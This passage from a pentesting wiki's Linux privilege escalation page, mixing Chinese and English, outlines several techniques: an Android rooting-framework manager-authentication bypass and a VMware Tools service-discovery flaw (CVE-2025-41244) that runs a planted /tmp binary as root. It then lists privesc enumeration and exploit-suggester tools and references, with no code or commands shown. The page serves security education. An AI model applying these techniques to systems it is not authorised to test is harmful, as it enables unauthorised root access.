**systemd** 作为现代的初始化和服务管理器出现，提供了按需启动守护进程、automount 管理和系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（发行版包）和 `/etc/systemd/system/`（管理员修改）中，从而简化了系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常 hook 一个 syscall，以将特权的内核功能暴露给 userspace manager。弱的 manager 认证（例如基于 FD-order 的签名校验或糟糕的密码方案）可能允许本地应用冒充该 manager，从而在已经 root 的设备上升级为 root。更多信息和利用细节见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations 中基于 regex 的 service discovery 可能会从进程命令行中提取二进制路径并在特权上下文下以 -v 执行它。宽松的匹配模式（例如使用 \S）可能会匹配攻击者放在可写位置（例如 /tmp/httpd）中的监听器，导致以 root 身份执行（CWE-426 Untrusted Search Path）。

了解更多并查看适用于其他 discovery/monitoring stacks 的通用模式：


{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
